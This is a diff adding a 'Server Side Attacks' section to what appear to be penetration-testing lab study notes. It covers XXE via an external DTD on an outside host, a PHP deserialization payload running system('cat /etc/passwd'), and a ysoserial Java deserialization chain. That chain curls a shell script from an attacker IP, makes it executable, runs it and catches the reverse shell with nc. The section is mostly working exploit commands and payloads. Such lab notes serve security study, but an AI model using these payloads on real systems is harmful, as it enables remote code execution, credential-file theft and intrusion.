@@ -85,3 +85,59 @@ Unicode itself is a system, but it’s stored using formats like:
 - **UTF-32**
 
 
+# 5. Server Side Attacks
+
+## SSRF to RCE
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+  <!ENTITY % dtd SYSTEM "http://192.24.20.2:8080/evil.dtd">
+  %dtd;
+  %all;
+]>
+<data>&fileContents;</data>
+```
+- The test.dtd file:
+```
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "http://localhost:8888">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+```
+
+## PHP Insecure Deserialization
+```
+<?php
+class PHPObjectInjection {
+    public $inject = "system('cat /etc/passwd');";
+}
+
+echo serialize(new PHPObjectInjection());
+?>
+
+❯ php aa.php 
+O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system('cat /etc/passwd');";}
+
+```
+
+## Java Insecure Deserialization 
+- I used this exploit code: https://github.com/breenmachine/JavaUnserializeExploits/blob/master/jenkins.py
+```
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'curl http://192.106.21.2:9090/shell.sh -o /tmp/a.sh' > rev.bin
+python2 aa.py demo.ine.local 8080 rev.bin
+```
+```
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'curl -X POST -d @/tmp/a.sh http://192.106.21.2:4444' > rev.bin
+python2 aa.py demo.ine.local 8080 rev.bin
+```
+```
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'chmod +x /tmp/a.sh' > rev.bin
+python2 aa.py demo.ine.local 8080 rev.bin
+```
+```
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'bash /tmp/a.sh' > rev.bin
+python2 aa.py demo.ine.local 8080 rev.bin
+```
+```
+nc -nvlp 4445
+```
